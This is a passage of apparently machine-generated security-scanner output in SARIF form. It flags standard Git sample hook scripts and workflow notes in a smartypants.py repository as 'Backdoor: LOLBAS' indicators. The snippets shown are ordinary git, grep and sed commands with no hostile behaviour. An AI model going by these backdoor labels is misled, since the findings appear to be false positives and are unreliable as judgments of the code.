                "region": {
                  "startLine": 102,
                  "startColumn": 42,
                  "endLine": 102,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                    "rendered": {
                      "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                      "markdown": "`   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 30,
                  "endLine": 40,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                      "markdown": "`# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 9,
                  "snippet": {
                    "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                    "rendered": {
                      "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                      "markdown": "`esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 48,
                  "endLine": 26,
                  "snippet": {
                    "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                    "rendered": {
                      "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                      "markdown": "`\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 18,
                  "endLine": 21,
                  "endColumn": 23,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 8,
                  "endLine": 21,
                  "endColumn": 14,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 21,
                  "startColumn": 1,
                  "endLine": 21,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n",
                      "markdown": "`# This example catches duplicate Signed-off-by lines.\n\ntest \"\" = \"$(grep '^Signed-off-by: ' \"$1\" |\n\t sort | uniq -c | sed -e '/^[ \t]*1[ \t]/d')\" || {\n\techo >&2 Duplicate Signed-off-by lines.\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 1,
                  "endLine": 16,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                    "rendered": {
                      "text": "# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n",
                      "markdown": "`# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 34,
                  "endLine": 15,
                  "endColumn": 39,
                  "snippet": {
                    "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                    "rendered": {
                      "text": "# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n",
                      "markdown": "`# Doing this in a hook is a bad idea in general, but the prepare-commit-msg\n# hook is more suited to it.\n#\n# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\\(.*>\\).*$/Signed-off-by: \\1/p')\n# grep -qs \"^$SOB\" \"$1\" || echo \"$SOB\" >> \"$1\"\n\n# This example catches duplicate Signed-off-by lines.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/commit-msg.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to check the commit log message.\n# Called by \"git commit\" with one argument, the name of the file\n# that has the commit message.  The hook should exit with non-zero\n# status after issuing an appropriate message if it wants to stop the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 15,
                  "endLine": 77,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 10,
                  "endLine": 7,
                  "endColumn": 18,
                  "snippet": {
                    "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                    "rendered": {
                      "text": "#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n",
                      "markdown": "`#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n# tries to update the branch that is currently checked out and the\n# receive.denyCurrentBranch configuration variable is set to\n# updateInstead.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 35,
                  "snippet": {
                    "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                    "rendered": {
                      "text": "#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n",
                      "markdown": "`#!/bin/sh\n\n# An example hook script to update a checked-out tree on a git push.\n#\n# This hook is invoked by git-receive-pack(1) when it reacts to git\n# push and updates reference(s) in its repository, and when the push\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 4,
                  "endLine": 75,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n",
                      "markdown": "`\tdie \"Working directory has staged changes\"\nfi\n\nif ! git read-tree -u -m \"$commit\"\nthen\n\tdie \"Could not update working tree to new HEAD\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 4,
                  "endLine": 70,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                    "rendered": {
                      "text": "\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n",
                      "markdown": "`\thead=$(git hash-object -t tree --stdin </dev/null)\nfi\n\nif ! git diff-index --quiet --cached --ignore-submodules $head --\nthen\n\tdie \"Working directory has staged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 18,
                  "endLine": 63,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 63,
                  "startColumn": 2,
                  "endLine": 63,
                  "endColumn": 7,
                  "snippet": {
                    "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                    "rendered": {
                      "text": "# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n",
                      "markdown": "`# This is a rough translation of:\n#\n#   head_has_history() ? \"HEAD\" : EMPTY_TREE_SHA1_HEX\nif git cat-file -e HEAD 2>/dev/null\nthen\n\thead=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 55,
                  "startColumn": 4,
                  "endLine": 55,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                    "rendered": {
                      "text": "\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n",
                      "markdown": "`\tdie \"Up-to-date check failed\"\nfi\n\nif ! git diff-files --quiet --ignore-submodules --\nthen\n\tdie \"Working directory has unstaged changes\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 9,
                  "snippet": {
                    "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                    "rendered": {
                      "text": "# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n",
                      "markdown": "`# the working tree, you will have to adapt your code accordingly, e.g.\n# by adding \"cd ..\" or using relative paths.\n\nif ! git update-index -q --ignore-submodules --refresh\nthen\n\tdie \"Up-to-date check failed\"\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 39,
                  "endLine": 37,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 25,
                  "endLine": 37,
                  "endColumn": 30,
                  "snippet": {
                    "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                    "rendered": {
                      "text": "# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n",
                      "markdown": "`# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 40,
                  "endLine": 36,
                  "endColumn": 45,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
                      "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                      "markdown": "`#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/smartypants.py.zip/.git/hooks/push-to-checkout.sample"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 36,
                  "endColumn": 11,
                  "snippet": {
                    "text": "#\n# For example, the hook can simply run git read-tree -u -m HEAD \"$1\"\n# in order to emulate git fetch that is run in the reverse direction\n# with git push, as the two-tree form of git read-tree -u -m is\n# essentially the same as git switch or git checkout that switches\n# branches while keeping the local changes in the working tree that do\n# not interfere with the difference between the branches.\n",
                    "rendered": {
